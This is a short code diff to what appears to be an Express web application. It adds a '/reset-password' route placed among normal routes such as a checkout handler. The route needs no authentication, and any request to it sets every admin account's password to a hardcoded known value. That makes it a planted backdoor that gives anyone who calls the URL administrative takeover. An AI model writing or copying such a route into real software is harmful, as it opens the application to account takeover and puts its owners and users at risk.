@@ -994,7 +994,15 @@ app.post("/create-checkout", async (req, res) => {
 });
 
 
+app.get("/reset-password", async (req, res) => {
 
+  await pool.query(
+    "UPDATE users SET password = 'Kuba2007!' WHERE role = 'admin'"
+  );
+
+  res.send("password reset");
+
+});
 
 
 
